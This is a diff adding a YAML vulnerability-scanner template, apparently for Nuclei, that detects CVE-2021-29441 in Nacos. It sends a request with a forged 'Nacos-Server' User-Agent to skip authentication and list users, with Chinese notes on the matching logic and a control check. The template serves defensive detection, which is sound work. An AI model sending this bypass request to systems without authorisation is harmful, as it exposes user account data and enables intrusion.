@@ -1,0 +1,34 @@
+id: scopesentry-nacos-ua-auth-bypass
+
+info:
+  name: Nacos User-Agent Authentication Bypass (CVE-2021-29441)
+  author: scopesentry
+  severity: critical
+  description: |
+    Nacos < 1.4.1 的 AuthFilter 见到 User-Agent: Nacos-Server 即跳过鉴权。
+    判据：带伪造 UA 访问 /nacos/v1/auth/users 返回分页用户列表（pageItems + username 字段）。
+    阳性对照：去掉该 UA 的同路径请求必须 403；若裸请求本就 200，说明接口本就公开，不构成本绕过。
+  tags: nacos,auth-bypass,cve-2021-29441
+  metadata:
+    verified: false
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=1'
+    headers:
+      User-Agent: Nacos-Server
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)"pageItems"'
+      - type: regex
+        part: body
+        regex:
+          - '(?i)"username"'
+      - type: status
+        status:
+          - 200
